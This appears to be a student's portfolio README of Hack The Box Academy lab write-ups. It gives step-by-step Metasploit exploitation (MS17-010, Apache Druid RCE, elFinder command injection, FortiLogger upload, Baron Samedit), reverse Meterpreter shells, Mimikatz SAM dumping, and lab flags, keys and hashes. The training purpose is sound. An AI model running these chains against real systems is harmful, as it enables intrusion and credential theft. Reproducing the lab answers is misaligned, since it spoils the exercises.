# Penetration Testing & Red Team Labs

A collection of hands-on offensive security labs from Hack The Box Academy,
covering network enumeration, service exploitation, password attacks,
Metasploit operations, privilege escalation, and web reconnaissance. Each
project includes full methodology, commands, screenshots, and final flags.

## Projects

| Project | Focus | Summary |
|---|---|---|
| [Individual Challenge 2](./PentestingIndividualChallenge2.pdf) | Enumeration · Web · SMB · PrivEsc | Performed foundational recon and exploitation: Nmap service scanning, FTP anonymous login, SMB share access with discovered credentials, HTML comment credential harvesting, WordPress plugin exploitation using Metasploit, and privilege escalation via sudo misconfiguration to retrieve user and root flags. |
| [Individual Challenge 3 — Network Enumeration with Nmap & Information Gathering (Web Edition)](./PentestingIndividualChallenge3.pdf) | Nmap · WHOIS · VHosts · ReconSpider | Conducted full network and web reconnaissance: WHOIS registrar analysis, WhatWeb fingerprinting, virtual host discovery with Gobuster, hidden admin directory enumeration, API key extraction, and automated crawling with ReconSpider to identify emails, comments, and developer artifacts. |
| [Individual Challenge 5 — Password Attacks & Using the Metasploit Framework](./TeekaramKaylaIndividualChallenge5.pdf) | Password Attacks · MS17-010 · RCE · PrivEsc | Executed multiple exploitation chains: MS17-010 (EternalRomance/EternalSynergy/EternalChampion) remote code execution, Apache Druid JS RCE, elFinder archive command injection, Meterpreter session and credential dumping with Mimikatz/Kiwi, and Baron Samedit sudo privilege escalation to obtain root access and flags. |

---

## Individual Challenge 3 — Detailed Write-Up

**Author:** Kayla Teekaram

### Network Enumeration with Nmap
Completed the HTB Academy "Network Enumeration with Nmap" module (Tier I,
Easy), covering live host identification, port scanning, service
enumeration, and OS detection fundamentals.

### Information Gathering — Web Edition: Skills Assessment

**1. What is the IANA ID of the registrar of the inlanefreight.com domain?**
Ran a `whois` lookup on the domain directly:
```
whois inlanefreight.com
```
The output showed the registrar as Amazon Registrar, Inc.
**Answer: `468`**

**2. What HTTP server software is powering the inlanefreight.htb site on the target system?**
Ran a `whois` lookup on the target's IP address, then added an `/etc/hosts`
entry to map the IP to `inlanefreight.htb`. Used WhatWeb against the mapped
hostname and port to fingerprint the web server:
```
whatweb http://inlanefreight.htb:31170
```
**Answer: `nginx`**

**3. What is the API key in the hidden admin directory discovered on the target system?**
Added `web1337.inlanefreight.htb:31170` to `/etc/hosts`, then ran Gobuster in
VHOST enumeration mode to discover the subdomain:
```
gobuster vhost -u http://inlanefreight.htb:31170 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```
Checked `/robots.txt` on the discovered vhost, which listed a disallowed
`admin_h1dd3n` directory. Navigating to it revealed the API key directly on
the page.
**Answer: `e963d863ee0e82ba7080fbf558ca0d3f`**

**4. After crawling the inlanefreight.htb domain, what email address was found?**
Re-ran Gobuster against the vhost with a larger thread count, discovering a
`dev.web1337.inlanefreight.htb` subdomain. Installed Scrapy and downloaded
HTB Academy's ReconSpider tool, then crawled the dev vhost:
```
python3 ReconSpider.py http://dev.web1337.inlanefreight.htb:31977
cat results.json | jq
```
The `emails` field in the JSON output contained the answer.
**Answer: `1337testing@inlanefreight.htb`**

**5. What is the API key the inlanefreight.htb developers will be changing to?**
Scrolled further through the ReconSpider crawl results under the
`comments` field, which contained an HTML comment reminding developers to
rotate the API key.
**Answer: `ba988b835be4aa97d068941dc852ff33`**

---

## Individual Challenge 5 — Detailed Write-Up

**Author:** Kayla Teekaram

Completed the HTB Academy "Password Attacks" (Tier I, Medium) and "Using the
Metasploit Framework" (Tier 0, Easy) modules.

### MSF Components — Modules
Exploited an MS17-010 (EternalRomance/EternalSynergy/EternalChampion) SMB
vulnerability on a Windows Server 2016 target:

1. Started `msfconsole` and searched for `EternalRomance`.
2. Selected `exploit/windows/smb/ms17_010_psexec` and reviewed its options
   with `show options`.
3. Set `RHOSTS` to the target IP and `LHOST` to the attacking VM's IP.
4. Ran `check` to confirm the target was vulnerable.
5. Reviewed exploit targets with `show targets` and set `TARGET 2`.
6. Set the payload to `windows/x64/meterpreter/reverse_tcp` and ran
   `exploit`, obtaining a SYSTEM-level Meterpreter session.
7. Read the flag directly from the target's desktop:
   ```
   cat C:\Users\Administrator\Desktop\flag.txt
   ```
**Answer: `HTB{MSF-W1nD0w5-3xPL01t4t10n}`**

### MSF Components — Payloads
Exploited an Apache Druid instance via a JavaScript remote code execution
vulnerability:

1. Started `msfconsole` and searched for `apache druid`.
2. Selected the JavaScript RCE exploit (`exploit/linux/http/apache_druid_js_rce`),
   set `RHOSTS` and `LHOST`, and verified options with `show options`.
3. Ran `exploit`, obtaining a Meterpreter session.
4. Listed the working directory with `ls`, then dropped into a standard
   shell since the Meterpreter `find` command wasn't available.
5. Searched the filesystem for the flag:
   ```
   find / -name flag.txt 2>/dev/null
   ```
6. Located and read the flag at `/root/flag.txt`.
**Answer: `HTB{MSF_Expl01t4t10n}`**

### MSF Sessions — Sessions & Jobs
**What web application is running on the target (found via HTML source)?**
Browsed to the target's IP and viewed the page source, which revealed the
application name in the page title.
**Answer: `elFinder`**

**Get a shell on the target — what username was obtained?**
1. Searched Metasploit for `elfinder` and selected
   `exploit/linux/http/elfinder_archive_cmd_injection`.
2. Set `RHOSTS` and `LHOST`, then ran `exploit` to get a Meterpreter session.
3. Checked the current user with `getuid`.
**Answer: `www-data`**

**Privilege escalation via an outdated Sudo version — find flag.txt and submit its contents:**
1. Backgrounded the existing session and searched Metasploit for `sudo`.
2. Selected `exploit/linux/local/sudo_baron_samedit`, set the `SESSION`,
   `LHOST`, and payload.
3. Ran the exploit to obtain a root-level session, dropped into a shell, and
   read the flag:
   ```
   cat /root/flag.txt
   ```
**Answer: `HTB{5e55ion5_4r3_sw33t}`**

### MSF Sessions — Meterpreter
**Find the existing exploit in MSF and get a shell — what username was obtained?**
1. Ran an Nmap scan (`sudo nmap -sV -p- -A <target>`) against the target.
2. Opened Metasploit, set `RHOSTS` and `LHOST`, and searched for
   `FortiLogger`, identifying an arbitrary file upload exploit.
3. Ran `exploit/windows/http/fortilogger_arbitrary_fileupload`, obtaining a
   Meterpreter session, and checked the user with `getuid`.
**Answer: `nt authority\system`**

**Retrieve the NTLM password hash for the "htb-student" user:**
1. Attempted `lsa_dump_sam` directly, which failed without the Kiwi
   extension loaded.
2. Loaded Mimikatz via `load kiwi`.
3. Re-ran `lsa_dump_sam`, which dumped the local SAM database including the
   `htb-student` account's NTLM hash.
**Answer: `cf3a5525ee9414229e66279623ed5c58`**

---

## Skills Demonstrated
- Network enumeration (Nmap, WhatWeb, Gobuster)
- Service exploitation (FTP, SMB, SSH, Telnet, Apache, Tomcat)
- Web application analysis (HTML source review, CMS fingerprinting, plugin vulnerability research)
- Metasploit exploitation (MS17-010, Apache Druid RCE, elFinder RCE, FortiLogger arbitrary file upload)
- Password attack methodology and remote credential testing
- Linux and Windows privilege escalation (sudo misconfigurations, Baron Samedit, credential dumping with Mimikatz/Kiwi)
- Automated reconnaissance (ReconSpider, Scrapy)
- Professional documentation and reporting of offensive security workflows

## Stack
Nmap · Gobuster · WhatWeb · Metasploit · Meterpreter · Mimikatz/Kiwi ·
SMBClient · Netcat · ReconSpider · Scrapy · Linux & Windows Privilege
Escalation Techniques · WordPress Plugin Exploits
